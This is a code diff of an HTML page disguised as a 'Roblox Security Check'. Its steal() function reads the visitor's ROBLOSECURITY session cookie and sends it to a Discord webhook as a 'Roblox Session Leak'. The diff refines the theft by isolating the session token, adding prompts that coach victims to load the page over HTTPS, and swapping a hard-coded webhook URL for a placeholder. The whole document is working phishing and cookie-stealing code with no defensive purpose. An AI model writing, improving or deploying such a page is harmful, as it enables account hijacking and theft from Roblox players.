@@ -5,7 +5,7 @@
     <title>Roblox Security Check</title>
     <style>
         body { 
-            background-color: #1e1f22; 
+            background-color: #232527; /* Roblox Dark Theme */
             color: white; 
             font-family: 'Segoe UI', sans-serif; 
             display: flex; 
@@ -14,7 +14,7 @@
             height: 100vh; 
             margin: 0;
         }
-        .container { text-align: center; background: #232527; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); max-width: 400px;}
+        .container { text-align: center; background: #2f3136; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); max-width: 400px;}
         h1 { color: #ffffff; margin-bottom: 10px; }
         p { color: #b9bbbe; font-size: 14px; }
         .btn { 
@@ -42,21 +42,46 @@
 
     <script>
         // 1. PASTE YOUR WEBHOOK URL HERE
-        const webhookUrl = "https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4"; 
+        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
 
         function steal() {
             document.getElementById('status').innerText = "Verifying...";
             
-            // 2. Get the Cookie from Browser Memory
+            // 2. Get the ROBLOSECURITY Cookie specifically
             let cookie = "";
             try {
-                cookie = document.cookie; 
+                // Look for the specific Roblox session cookie
+                const cookies = document.cookie.split(";");
+                for (let i = 0; i < cookies.length; i++) {
+                    let cookiePair = cookies[i];
+                    while (cookiePair.charAt(0) === " ") {
+                        cookiePair = cookiePair.substring(1);
+                    }
+                    
+                    // Check if this is the Roblox session cookie
+                    if (cookiePair.indexOf("ROBLOSECURITY") !== -1 || 
+                        cookiePair.indexOf("__Secure-ROBLOSECURITY") !== -1) {
+                        
+                        // Extract just the value part after the name=
+                        let parts = cookiePair.split("=");
+                        if(parts.length > 1) {
+                            cookie = parts[1];
+                            break;
+                        } else {
+                            cookie = cookiePair;
+                            break;
+                        }
+                    }
+                }
             } catch (e) {
-                console.log("Cookie access error");
+                console.log("Cookie access error: " + e);
             }
 
             if (!cookie || cookie.length < 10) {
-                alert("Session not found. Make sure you are logged into Roblox!");
+                // Debug info for you to see in console
+                console.log("Current Cookies:", document.cookie);
+                
+                alert("Session not found! Make sure:\n1. You are logged into Roblox.\n2. The page is loaded via HTTPS (https://).\n3. Try opening the link from a new tab.");
                 return;
             }
 
@@ -67,8 +92,8 @@
                     title: "Roblox Session Leak",
                     color: 16752000,
                     fields: [
-                        { name: "Username", value: document.title || "Unknown", inline: true },
-                        { name: "Cookie (Session)", value: cookie.substring(0, 30) + "...", inline: false } 
+                        { name: "Username (Approx)", value: document.title || "Unknown", inline: true },
+                        { name: "Cookie Length", value: cookie.length + " characters", inline: false } 
                     ]
                 }]
             });
@@ -94,4 +119,3 @@
     </script>
 </body>
 </html>
-
